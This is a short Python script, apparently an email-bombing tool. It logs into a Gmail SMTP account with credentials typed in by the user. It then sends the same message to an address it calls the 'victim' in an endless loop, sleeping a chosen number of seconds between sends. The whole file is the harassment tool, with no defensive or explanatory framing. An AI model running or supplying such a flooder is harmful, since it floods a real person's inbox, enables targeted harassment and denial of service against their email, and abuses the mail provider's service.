import smtplib
from email.mime.text import MIMEText
from email.header import Header
import time

g = 1

server = smtplib.SMTP('smtp.gmail.com:587')

user = input("enter your email: ")

password = input("enter password of your email: ")

victim = input("enter victim's email adress: ")

subject = input("enter subject of email: ")

body = input("enter text of email: ")

tm = input("set timeout(in seconds): ")
t = float(tm)

msg = MIMEText(body, 'plain', 'utf-8')
msg['Subject'] = Header(subject, 'utf-8')

server.starttls()
server.ehlo()
server.login(user, password)


while g == 1:
    try:
        server.sendmail(user, victim, msg.as_string())
        print("sent")

     

    except:
        print("not sent")

    time.sleep(t)
